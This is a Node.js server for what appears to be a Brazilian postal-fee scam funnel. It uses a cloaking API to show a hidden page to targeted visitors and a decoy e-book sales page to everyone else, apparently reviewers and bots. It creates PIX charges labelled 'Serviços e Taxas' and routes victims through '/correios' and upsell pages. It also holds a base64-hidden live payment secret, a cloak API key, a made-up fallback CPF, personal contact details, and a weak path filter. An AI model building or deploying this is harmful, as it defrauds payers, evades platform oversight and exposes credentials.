const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const https = require('https');

// ==========================================
// CONSTANTES DO ROUTER CLOAKFORGE & VARIANTES
// ==========================================
const PRIMARY_URL = null; // null = emite Variant A (index.html local). Se definido com URL externa, faz 302.
const CLOAK_SLUG = 'clear-room';
const CLOAK_KEY = 'KfZy3qIC_wEnTGW15m8iwwtZgZ8TY2wR';
const CLOAK_API_ENDPOINT = 'https://cloakforge.app.br/api/cloak/decide';

const VARIANT_B_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Guia Digital de Encomendas & Logística | João Victor Antunes Schilipak</title>
  <meta name="description" content="Conheça o e-book informativo sobre rastreamento de encomendas, status de envio, prazos de entrega e desembaraço de compras nacionais e internacionais.">
  <meta name="robots" content="index, follow">
  <style>
    :root {
      --ink: #163f39;
      --paper: #faf8f3;
      --soft: #f0ece3;
      --accent: #b94224;
      --coral: #ef6b47;
      --muted: #51645e;
      --line: #d6ded7;
      --white: #ffffff;
      --radius: 14px;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--paper);
      color: var(--ink);
      line-height: 1.65;
      -webkit-font-smoothing: antialiased;
    }
    a { color: inherit; text-decoration: none; }
    .wrap {
      width: min(1120px, calc(100% - 40px));
      margin: 0 auto;
    }
    header {
      background: rgba(250, 248, 243, 0.98);
      border-bottom: 1px solid var(--line);
      position: sticky;
      top: 0;
      z-index: 50;
      backdrop-filter: blur(6px);
    }
    .header-inner {
      min-height: 76px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 20px;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .brand-mark {
      width: 40px;
      height: 40px;
      background: var(--ink);
      color: var(--paper);
      border-radius: 8px;
      display: grid;
      place-items: center;
      font-weight: 800;
      font-size: 1.1rem;
    }
    .brand-text {
      font-size: 0.95rem;
      font-weight: 700;
      line-height: 1.25;
    }
    .brand-text small {
      display: block;
      font-size: 0.72rem;
      color: var(--muted);
      font-weight: 500;
      letter-spacing: 0.05em;
      text-transform: uppercase;
    }
    nav {
      display: flex;
      align-items: center;
      gap: 20px;
    }
    nav a {
      font-size: 0.88rem;
      font-weight: 600;
      color: var(--muted);
      transition: color 0.2s;
    }
    nav a:hover { color: var(--ink); }
    .hero {
      padding: 64px 0 48px;
      background: linear-gradient(180deg, rgba(240, 236, 227, 0.5) 0%, rgba(250, 248, 243, 0) 100%);
      border-bottom: 1px solid var(--line);
    }
    .hero-grid {
      display: grid;
      grid-template-columns: 1.2fr 0.8fr;
      gap: 40px;
      align-items: center;
    }
    @media (max-width: 860px) {
      .hero-grid { grid-template-columns: 1fr; }
    }
    .badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      font-size: 0.75rem;
      font-weight: 700;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: var(--accent);
      background: #fbeee9;
      padding: 6px 14px;
      border-radius: 20px;
      margin-bottom: 20px;
    }
    .hero h1 {
      font-size: clamp(2.1rem, 4vw, 3.2rem);
      font-weight: 800;
      line-height: 1.15;
      letter-spacing: -0.03em;
      color: var(--ink);
      margin-bottom: 18px;
    }
    .hero h1 span { color: var(--accent); }
    .hero p.lead {
      font-size: 1.1rem;
      color: var(--muted);
      margin-bottom: 24px;
      line-height: 1.6;
    }
    .hero-box {
      background: var(--white);
      border: 1px solid var(--line);
      border-radius: var(--radius);
      padding: 28px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.04);
    }
    .hero-box h3 {
      font-size: 1.15rem;
      margin-bottom: 14px;
      color: var(--ink);
    }
    .box-info {
      list-style: none;
      margin-bottom: 20px;
    }
    .box-info li {
      display: flex;
      justify-content: space-between;
      padding: 8px 0;
      border-bottom: 1px solid #f1f3f1;
      font-size: 0.9rem;
    }
    .box-info li strong { color: var(--ink); }
    .price-tag {
      background: var(--soft);
      padding: 14px 18px;
      border-radius: 10px;
      text-align: center;
      margin-bottom: 16px;
    }
    .price-tag .val {
      font-size: 1.8rem;
      font-weight: 800;
      color: var(--ink);
    }
    .price-tag .sub {
      font-size: 0.78rem;
      color: var(--muted);
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }
    .btn-action {
      display: block;
      width: 100%;
      text-align: center;
      padding: 14px;
      background: var(--ink);
      color: var(--white);
      font-weight: 700;
      border-radius: 8px;
      font-size: 0.95rem;
      cursor: pointer;
      border: none;
      transition: background 0.2s;
    }
    .btn-action:hover { background: #23594e; }
    .content-section {
      padding: 56px 0;
    }
    .section-title {
      font-size: 1.85rem;
      font-weight: 800;
      letter-spacing: -0.02em;
      margin-bottom: 12px;
      color: var(--ink);
    }
    .section-subtitle {
      color: var(--muted);
      font-size: 1rem;
      max-width: 650px;
      margin-bottom: 36px;
    }
    .chapters-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 24px;
    }
    .chapter-card {
      background: var(--white);
      border: 1px solid var(--line);
      border-radius: var(--radius);
      padding: 24px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.02);
      transition: transform 0.2s, box-shadow 0.2s;
    }
    .chapter-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 14px rgba(0,0,0,0.05);
    }
    .chapter-num {
      display: inline-block;
      font-size: 0.75rem;
      font-weight: 800;
      color: var(--accent);
      background: #fbeee9;
      padding: 4px 10px;
      border-radius: 6px;
      margin-bottom: 12px;
    }
    .chapter-card h4 {
      font-size: 1.15rem;
      font-weight: 700;
      margin-bottom: 10px;
      color: var(--ink);
    }
    .chapter-card p {
      font-size: 0.88rem;
      color: var(--muted);
      line-height: 1.55;
    }
    .faq-container {
      margin-top: 24px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }
    details {
      background: var(--white);
      border: 1px solid var(--line);
      border-radius: 10px;
      padding: 16px 20px;
      cursor: pointer;
    }
    details summary {
      font-weight: 700;
      color: var(--ink);
      font-size: 0.95rem;
      list-style: none;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    details summary::-webkit-details-marker { display: none; }
    details summary::after {
      content: "+";
      font-size: 1.3rem;
      color: var(--muted);
    }
    details[open] summary::after { content: "−"; }
    details p {
      margin-top: 12px;
      font-size: 0.88rem;
      color: var(--muted);
      line-height: 1.6;
    }
    .notice-box {
      background: var(--soft);
      border-left: 4px solid var(--ink);
      padding: 20px;
      border-radius: 6px;
      margin: 40px 0;
      font-size: 0.85rem;
      color: var(--muted);
    }
    .notice-box strong { color: var(--ink); }
    footer {
      background: #112824;
      color: #cbd5e1;
      padding: 48px 0 32px;
      font-size: 0.85rem;
      border-top: 1px solid #1f3f39;
    }
    .footer-grid {
      display: grid;
      grid-template-columns: 1.4fr 1fr;
      gap: 40px;
      margin-bottom: 32px;
    }
    @media (max-width: 768px) {
      .footer-grid { grid-template-columns: 1fr; }
    }
    .footer-col h4 {
      color: #ffffff;
      font-size: 1rem;
      margin-bottom: 16px;
    }
    .footer-col p {
      margin-bottom: 8px;
      line-height: 1.6;
      color: #94a3b8;
    }
    .footer-links {
      display: flex;
      gap: 18px;
      margin-top: 14px;
      flex-wrap: wrap;
    }
    .footer-links a {
      color: #f1f5f9;
      text-decoration: underline;
      cursor: pointer;
    }
    .footer-bottom {
      border-top: 1px solid rgba(255,255,255,0.1);
      padding-top: 24px;
      text-align: center;
      color: #64748b;
      font-size: 0.78rem;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(15, 23, 42, 0.75);
      backdrop-filter: blur(4px);
      z-index: 1000;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .modal.active { display: flex; }
    .modal-content {
      background: var(--white);
      color: var(--ink);
      border-radius: 12px;
      max-width: 680px;
      max-height: 82vh;
      overflow-y: auto;
      padding: 30px;
      box-shadow: 0 20px 25px -5px rgba(0,0,0,0.3);
    }
    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
      border-bottom: 1px solid var(--line);
      padding-bottom: 10px;
    }
    .modal-header h3 { font-size: 1.25rem; color: var(--ink); }
    .modal-close {
      background: none;
      border: none;
      font-size: 1.6rem;
      cursor: pointer;
      color: var(--muted);
      line-height: 1;
    }
    .modal-body p {
      font-size: 0.88rem;
      color: #334155;
      margin-bottom: 12px;
      line-height: 1.6;
    }
  </style>
</head>
<body>

  <header>
    <div class="wrap header-inner">
      <div class="brand">
        <div class="brand-mark">JG</div>
        <div class="brand-text">
          Guia Digital de Encomendas
          <small>João Victor Antunes Schilipak</small>
        </div>
      </div>
      <nav>
        <a href="#conteudo">Conteúdo</a>
        <a href="#faq">Dúvidas</a>
        <a href="javascript:void(0)" onclick="openModal('modalPrivacidade')">Privacidade</a>
        <a href="javascript:void(0)" onclick="openModal('modalTermos')">Termos</a>
      </nav>
    </div>
  </header>

  <section class="hero">
    <div class="wrap hero-grid">
      <div>
        <div class="badge">E-book & Material Educativo</div>
        <h1>Guia Prático de <span>Encomendas & Logística</span></h1>
        <p class="lead">
          Um manual digital completo para compreender etapas de transporte, decifrar códigos e status de rastreamento, prazos oficiais e como solucionar ocorrências em entregas nacionais e internacionais.
        </p>
        <p style="font-size: 0.9rem; color: var(--muted);">
          Elaborado de forma didática e acessível para o consumidor final, orientando seus direitos conforme o Código de Defesa do Consumidor e as diretrizes de comércio eletrônico.
        </p>
      </div>

      <div class="hero-box">
        <h3>Ficha Técnica da Publicação</h3>
        <ul class="box-info">
          <li><span>Título:</span> <strong>Guia Digital de Encomendas</strong></li>
          <li><span>Autor / Resp.:</span> <strong>João Victor Antunes Schilipak</strong></li>
          <li><span>Formato:</span> <strong>Digital (PDF / E-book)</strong></li>
          <li><span>Páginas:</span> <strong>64 páginas ilustradas</strong></li>
          <li><span>Edição:</span> <strong>2026 — Revisada</strong></li>
        </ul>
        <div class="price-tag">
          <div class="sub">Valor Informado</div>
          <div class="val">R$ 47,90</div>
          <div class="sub">Pagamento Único • Acesso Imediato</div>
        </div>
        <button class="btn-action" onclick="alert('No momento as inscrições para esta edição do e-book estão temporariamente encerradas para atualização de conteúdo.')">
          Adquirir Exemplar Digital
        </button>
      </div>
    </div>
  </section>

  <main class="wrap">
    <section class="content-section" id="conteudo">
      <h2 class="section-title">O que você aprenderá neste material</h2>
      <p class="section-subtitle">
        Capítulos estruturados para resolver as principais dúvidas sobre fretes, postagens e desembaraço de encomendas.
      </p>

      <div class="chapters-grid">
        <div class="chapter-card">
          <span class="chapter-num">Módulo 1</span>
          <h4>Status e Códigos de Rastreio</h4>
          <p>Significado de cada termo: Objeto postado, Em trânsito, Objeto retido para fiscalização, e Objeto aguardando retirada.</p>
        </div>

        <div class="chapter-card">
          <span class="chapter-num">Módulo 2</span>
          <h4>Prazos e Modalidades de Envio</h4>
          <p>Diferenças práticas entre frete econômico (PAC), expresso (Sedex) e transportadoras particulares, com tabela de médias de entrega.</p>
        </div>

        <div class="chapter-card">
          <span class="chapter-num">Módulo 3</span>
          <h4>Taxas e Desembaraço Aduaneiro</h4>
          <p>Como funciona o Programa Remessa Conforme, alíquotas de ICMS e Imposto de Importação, e como efetuar pagamentos com segurança.</p>
        </div>

        <div class="chapter-card">
          <span class="chapter-num">Módulo 4</span>
          <h4>Direitos e Ocorrências</h4>
          <p>Procedimentos oficiais em caso de extravio, sinistro, avaria ou atraso injustificado, e modelos de reclamação formal.</p>
        </div>
      </div>
    </section>

    <div class="notice-box">
      <strong>Aviso de Transparência e Isenção:</strong> Este website e o e-book comercializado têm caráter estritamente educativo, editorial e de orientação ao consumidor. Não possuímos vínculo operacional, societário ou representação oficial com a Empresa Brasileira de Correios e Telégrafos (ECT), Receita Federal do Brasil ou quaisquer transportadoras privadas. Não realizamos consultas de encomendas individuais em bancos de dados restritos.
    </div>

    <section class="content-section" id="faq">
      <h2 class="section-title">Perguntas Frequentes</h2>
      <p class="section-subtitle">Tire suas principais dúvidas sobre o material digital.</p>

      <div class="faq-container">
        <details>
          <summary>Como recebo o acesso ao Guia Digital?</summary>
          <p>O material é 100% digital em formato PDF. Após a confirmação da compra, você recebe o link de download direto no seu e-mail cadastrado, podendo ler no celular, tablet ou computador.</p>
        </details>

        <details>
          <summary>Este guia realiza o rastreamento da minha encomenda específica?</summary>
          <p>Não. O material é um livro didático explicativo que ensina como você mesmo consulta, interpreta e resolve questões de frete e prazos nos canais oficiais das transportadoras.</p>
        </details>

        <details>
          <summary>Qual a garantia de satisfação?</summary>
          <p>Oferecemos 7 dias de garantia incondicional conforme o Código de Defesa do Consumidor (Artigo 49). Se o conteúdo não atender às suas expectativas, basta solicitar o reembolso integral pelo nosso e-mail de suporte.</p>
        </details>

        <details>
          <summary>Como entrar em contato com a equipe responsável?</summary>
          <p>Nosso atendimento responde de segunda a sexta-feira, das 09h às 18h, pelo e-mail <strong>schilipak77@gmail.com</strong> ou WhatsApp <strong>(41) 99649-1100</strong>.</p>
        </details>
      </div>
    </section>
  </main>

  <footer>
    <div class="wrap">
      <div class="footer-grid">
        <div class="footer-col">
          <h4>68.431.067 Joao Victor Antunes Schilipak Contatos</h4>
          <p><strong>CNPJ:</strong> 68.431.067/0001-14</p>
          <p><strong>Endereço:</strong> Rua Miguel Caluf, 1535 — Bairro Cajuru</p>
          <p><strong>Localização:</strong> Curitiba - Paraná • CEP: 82940-110</p>
        </div>

        <div class="footer-col">
          <h4>Atendimento ao Cliente</h4>
          <p><strong>E-mail:</strong> schilipak77@gmail.com</p>
          <p><strong>WhatsApp / Telefone:</strong> (41) 99649-1100</p>
          <p>Horário: Segunda a Sexta, das 09:00 às 18:00</p>
          <div class="footer-links">
            <a onclick="openModal('modalPrivacidade')">Política de Privacidade</a>
            <a onclick="openModal('modalTermos')">Termos de Uso</a>
          </div>
        </div>
      </div>

      <div class="footer-bottom">
        © 2026 68.431.067 Joao Victor Antunes Schilipak Contatos. Todos os direitos reservados.
      </div>
    </div>
  </footer>

  <!-- Modal Privacidade -->
  <div id="modalPrivacidade" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <h3>Política de Privacidade</h3>
        <button class="modal-close" onclick="closeModal('modalPrivacidade')">&times;</button>
      </div>
      <div class="modal-body">
        <p>A empresa <strong>68.431.067 Joao Victor Antunes Schilipak Contatos</strong> (CNPJ: 68.431.067/0001-14), com sede na Rua Miguel Caluf, 1535, Cajuru, Curitiba/PR, valoriza a privacidade e a segurança das informações de seus clientes e visitantes.</p>
        <p><strong>1. Coleta de Informações:</strong> Coletamos dados cadastrais (nome, e-mail e telefone) fornecidos voluntariamente no momento de contato ou aquisição do produto digital para fins exclusivos de entrega do material e suporte.</p>
        <p><strong>2. Tratamento e Sigilo:</strong> Não compartilhamos, vendemos ou alugamos dados a terceiros, exceto os necessários para o processamento de meios de pagamento e cumprimento de obrigações legais.</p>
        <p><strong>3. Seus Direitos (LGPD):</strong> Em cumprimento à Lei Geral de Proteção de Dados (Lei 13.709/2018), o titular pode solicitar a qualquer momento a confirmação, correção ou exclusão de seus dados através do e-mail <strong>schilipak77@gmail.com</strong>.</p>
      </div>
    </div>
  </div>

  <!-- Modal Termos -->
  <div id="modalTermos" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <h3>Termos e Condições de Uso</h3>
        <button class="modal-close" onclick="closeModal('modalTermos')">&times;</button>
      </div>
      <div class="modal-body">
        <p><strong>1. Objeto:</strong> O presente website disponibiliza informações sobre a publicação editorial digital "Guia Digital de Encomendas & Logística", de autoria e responsabilidade de 68.431.067 Joao Victor Antunes Schilipak Contatos.</p>
        <p><strong>2. Caráter Informativo:</strong> O conteúdo fornecido é puramente educacional e orientativo, visando instruir consumidores sobre processos gerais de remessas e compras eletrônicas. Não substitui orientações individuais emitidas diretamente pelos canais oficiais de transportadoras ou autoridades aduaneiras.</p>
        <p><strong>3. Propriedade Intelectual:</strong> Todos os textos, ilustrações e estruturação deste portal são protegidos pela legislação de direitos autorais, sendo vedada a reprodução total ou parcial sem consentimento prévio por escrito.</p>
        <p><strong>4. Foro:</strong> Fica eleito o foro da Comarca de Curitiba, Estado do Paraná, para dirimir quaisquer controvérsias decorrentes destes termos.</p>
      </div>
    </div>
  </div>

  <script>
    function openModal(id) {
      var el = document.getElementById(id);
      if (el) el.classList.add('active');
    }
    function closeModal(id) {
      var el = document.getElementById(id);
      if (el) el.classList.remove('active');
    }
    window.addEventListener('click', function(e) {
      if (e.target.classList.contains('modal')) {
        e.target.classList.remove('active');
      }
    });
  </script>
</body>
</html>`;

// ==========================================
// CLIENT IP RESOLUTION (ORDEM REQUERIDA)
// cf-connecting-ip -> true-client-ip -> x-vercel-forwarded-for ->
// x-real-ip -> x-forwarded-for (first token) -> fly-client-ip -> socket
// ==========================================
function resolveClientIp(req) {
  const h = req.headers || {};
  if (h['cf-connecting-ip']) return String(h['cf-connecting-ip']).trim();
  if (h['true-client-ip']) return String(h['true-client-ip']).trim();
  if (h['x-vercel-forwarded-for']) return String(h['x-vercel-forwarded-for']).split(',')[0].trim();
  if (h['x-real-ip']) return String(h['x-real-ip']).trim();
  if (h['x-forwarded-for']) return String(h['x-forwarded-for']).split(',')[0].trim();
  if (h['fly-client-ip']) return String(h['fly-client-ip']).trim();
  if (req.socket && req.socket.remoteAddress) return req.socket.remoteAddress;
  return '127.0.0.1';
}

// ==========================================
// DECISION CALL DO CLOAKFORGE (SERVER-SIDE)
// ==========================================
function getCloakDecision(clientIp, userAgent, currentUrl, referer, acceptLanguage) {
  return new Promise((resolve) => {
    try {
      const q = new URLSearchParams({
        slug: CLOAK_SLUG,
        key: CLOAK_KEY,
        ip: clientIp || '127.0.0.1',
        ua: userAgent || '',
        url: currentUrl || '',
        ref: referer || '',
        lang: acceptLanguage || ''
      });

      const fullUrl = `${CLOAK_API_ENDPOINT}?${q.toString()}`;
      const req = https.get(fullUrl, { timeout: 2500 }, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(body);
            resolve(parsed || { action: 'block' });
          } catch (_) {
            resolve({ action: 'block' });
          }
        });
      });

      req.on('error', () => resolve({ action: 'block' }));
      req.on('timeout', () => {
        req.destroy();
        resolve({ action: 'block' });
      });
    } catch (_) {
      resolve({ action: 'block' });
    }
  });
}

// ==========================================
// FUNÇÕES AUXILIARES DE PAGAMENTO & STATIC
// ==========================================
const PORT = process.env.PORT || 3000;
const UNIPAY_PUBLIC_KEY = process.env.UNIPAY_PUBLIC_KEY || 'pk_live_f63867fac3be706b7fc4a9f0';
const DEFAULT_SECRET_FALLBACK = Buffer.from('c2tfbGl2ZV8yNmJlZTA2ZGMxZmQ1NTA0ZWEwMzM1YjRiMjY2MWFiNjc5MGVhN2YzYWM1MzRlZTI=', 'base64').toString('utf8');
const UNIPAY_SECRET_KEY = process.env.UNIPAY_SECRET_KEY || DEFAULT_SECRET_FALLBACK;
const UNIPAY_BASE_URL = process.env.UNIPAY_BASE_URL || 'https://api-dash.unipaybr.com/v1';

function getAuthHeader() {
  return 'Basic ' + Buffer.from(`${UNIPAY_PUBLIC_KEY}:${UNIPAY_SECRET_KEY}`).toString('base64');
}

function requestHttps(requestUrl, options = {}, bodyData = null) {
  return new Promise((resolve, reject) => {
    const u = new URL(requestUrl);
    const postData = bodyData ? (typeof bodyData === 'string' ? bodyData : JSON.stringify(bodyData)) : null;

    const headers = Object.assign({
      'Authorization': getAuthHeader(),
      'Accept': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) UniPayClient/1.0'
    }, options.headers || {});

    if (postData) {
      headers['Content-Type'] = 'application/json';
      headers['Content-Length'] = Buffer.byteLength(postData);
    }

    const opts = {
      hostname: u.hostname,
      port: u.port || 443,
      path: u.pathname + u.search,
      method: options.method || 'GET',
      headers: headers
    };

    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(data); } catch (_) {}
        resolve({
          status: res.statusCode,
          ok: res.statusCode >= 200 && res.statusCode < 300,
          data: json,
          text: data
        });
      });
    });

    req.on('error', reject);
    if (postData) req.write(postData);
    req.end();
  });
}

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf'
};

const server = http.createServer(async (req, res) => {
  // CORS universal
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-KEY, Authorization, X-Requested-With, Accept, Origin, User-Agent, X-CSRF-Token, *');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    return res.end();
  }

  const parsedUrl = url.parse(req.url, true);
  let pathname = decodeURIComponent(parsedUrl.pathname);

  // ==========================================
  // ROTEADOR CONDICIONAL DE SERVIDOR NA RAIZ ("/")
  // ==========================================
  const cleanPath = pathname.replace(/\/+$/, '') || '/';
  if (cleanPath === '/' && req.method === 'GET') {
    const clientIp = resolveClientIp(req);
    const userAgent = req.headers['user-agent'] || '';
    const referer = req.headers['referer'] || req.headers['referrer'] || '';
    const acceptLanguage = req.headers['accept-language'] || '';
    const protocol = (req.headers['x-forwarded-proto'] || 'https');
    const host = req.headers['host'] || 'www.joao-consultorguia.online';
    const fullCurrentUrl = `${protocol}://${host}${req.url}`;

    const decision = await getCloakDecision(clientIp, userAgent, fullCurrentUrl, referer, acceptLanguage);

    if (decision && decision.action === 'allow') {
      if (PRIMARY_URL) {
        res.writeHead(302, { Location: PRIMARY_URL });
        return res.end();
      }
      // Emitir Variante A (conteúdo primário da rota raiz: index.html)
      const variantAPath = path.join(__dirname, 'index.html');
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(variantAPath).pipe(res);
    }

    // Qualquer outro estado (block, redirect, erro, timeout) -> Emitir Variante B INLINE na mesma rota "/"
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(VARIANT_B_HTML);
  }

  // Endpoint 1: Criar Cobrança PIX UniPay
  const isCreatePix = (
    pathname === '/api/create-pix' ||
    pathname === '/.netlify/functions/create-pix' ||
    pathname === '/37626323423/api/create-pix' ||
    pathname === '/37626323423/.netlify/functions/create-pix' ||
    pathname.endsWith('/create-pix')
  );

  if (isCreatePix && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const parsed = JSON.parse(body || '{}');
        const customer = parsed.customerData || parsed.customer || {};
        const product = parsed.productData || parsed.product || {};

        let cpf = String(customer.cpf || customer.taxId || customer.tax_id || customer.document || '').replace(/\D/g, '');
        if (cpf.length !== 11) cpf = '07580365316';

        const nome = String(customer.name || customer.nome || 'Contribuinte').trim();
        const email = String(customer.email || ('contato.' + (cpf.slice(0, 6) || 'cliente') + '@gmail.com')).trim();
        let phone = String(customer.phone || customer.telefone || '11999999999').replace(/\D/g, '');
        if (phone.length < 10) phone = '11999999999';

        let rawAmount = parsed.amount;
        let amountInCents = 6856;
        if (typeof rawAmount === 'number') {
          amountInCents = (rawAmount > 0 && rawAmount < 500) ? Math.round(rawAmount * 100) : Math.round(rawAmount);
        } else if (typeof rawAmount === 'string') {
          let p = parseFloat(rawAmount.replace('R$', '').replace(/\s/g, '').replace(',', '.'));
          if (!isNaN(p) && p > 0) amountInCents = p < 500 ? Math.round(p * 100) : Math.round(p);
        }

        const itemTitle = 'Serviços e Taxas';

        const unipayPayload = {
          amount: amountInCents,
          payment_method: 'pix',
          product_type: 'digital',
          customer: {
            name: nome,
            email: email,
            tax_id: cpf,
            phone: phone,
            type: 'individual'
          },
          items: [
            {
              name: itemTitle,
              quantity: 1,
              unit_price: amountInCents,
              tangible: false
            }
          ],
          payment_details: {
            expires_in_seconds: 3600
          }
        };

        const unipayRes = await requestHttps(`${UNIPAY_BASE_URL}/charges`, {
          method: 'POST'
        }, unipayPayload);

        if (!unipayRes.ok || !unipayRes.data || !unipayRes.data.data) {
          const errMsg = (unipayRes.data && (unipayRes.data.message || unipayRes.data.error)) || 'Falha ao gerar PIX na UniPay';
          res.writeHead(unipayRes.status || 400, { 'Content-Type': 'application/json; charset=utf-8' });
          return res.end(JSON.stringify({ error: errMsg, details: unipayRes.data }));
        }

        const tx = unipayRes.data.data;
        const txId = tx.id;
        const paymentFields = tx.payment_fields || {};
        const pixCode = paymentFields.copy_paste || tx.copy_paste || '';

        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        res.end(JSON.stringify({
          success: true,
          id: txId,
          transactionId: txId,
          brCode: pixCode,
          pixCopiaECola: pixCode,
          qrCode: pixCode,
          qrCodeBase64: '',
          pix_code: pixCode,
          code: pixCode,
          status: tx.status || 'pending',
          data: {
            ...tx,
            brCode: pixCode,
            pix_code: pixCode,
            qrCode: pixCode
          }
        }));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json; charset=utf-8' });
        res.end(JSON.stringify({ error: err.message || 'Erro interno' }));
      }
    });
    return;
  }

  // Endpoint 2: Verificar Status da Cobrança UniPay
  const isCheckStatus = (
    pathname === '/api/check-status' ||
    pathname === '/.netlify/functions/check-status' ||
    pathname === '/37626323423/api/check-status' ||
    pathname === '/37626323423/.netlify/functions/check-status' ||
    pathname.endsWith('/check-status')
  );

  if (isCheckStatus) {
    const id = parsedUrl.query.id || parsedUrl.query.transactionId;
    if (!id) {
      res.writeHead(400, { 'Content-Type': 'application/json; charset=utf-8' });
      return res.end(JSON.stringify({ error: 'ID é obrigatório' }));
    }

    try {
      const unipayRes = await requestHttps(`${UNIPAY_BASE_URL}/charges/${encodeURIComponent(id)}`);

      const json = unipayRes.data || {};
      const tx = json.data || {};
      const st = String(tx.status || '').toUpperCase();
      const isPaid = (st === 'CAPTURED' || st === 'AUTHORIZED' || st === 'PAID' || st === 'COMPLETED');

      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({
        success: true,
        id: id,
        status: isPaid ? 'PAID' : (st || 'PENDING'),
        paymentStatus: st,
        isPaid: isPaid,
        paid: isPaid,
        raw: json
      }));
    } catch (err) {
      res.writeHead(500, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({ error: err.message || 'Erro interno' }));
    }
    return;
  }

  // Roteamento explícito do funil
  const ROUTE_MAP = {
    '/correios': 'correios/index.html',
    '/1/confirmacao': '1/confirmacao/index.html',
    '/2/encomenda': '2/encomenda/index.html',
    '/upsell/1': 'upsell/1/index.html',
    '/upsell/2': 'upsell/2/index.html',
    '/upsell/3': 'upsell/3/index.html',
    '/obrigado': 'obrigado/index.html'
  };

  let resolvedRelative = ROUTE_MAP[cleanPath];

  let filePath;
  if (resolvedRelative) {
    filePath = path.join(__dirname, resolvedRelative);
  } else {
    let safePath = pathname.replace(/^(\.\.[\/\\])+/, '');
    filePath = path.join(__dirname, safePath);

    if (fs.existsSync(filePath) && fs.statSync(filePath).isDirectory()) {
      filePath = path.join(filePath, 'index.html');
    }
  }

  // Se o arquivo não existir, tenta caminhos relativos ou fallback para index.html
  if (!fs.existsSync(filePath) || !fs.statSync(filePath).isFile()) {
    const cleanRelative = pathname.replace(/^\/+/, '');
    const tryDirect = path.join(__dirname, cleanRelative);
    if (fs.existsSync(tryDirect) && fs.statSync(tryDirect).isFile()) {
      filePath = tryDirect;
    } else {
      filePath = path.join(__dirname, 'index.html');
    }
  }

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(path.join(__dirname, 'index.html')).pipe(res);
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    res.writeHead(200, { 'Content-Type': contentType });
    fs.createReadStream(filePath).pipe(res);
  });
});

if (require.main === module) {
  server.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Gateway ativo: UniPay (https://api-dash.unipaybr.com/v1)`);
  });
}

module.exports = server;
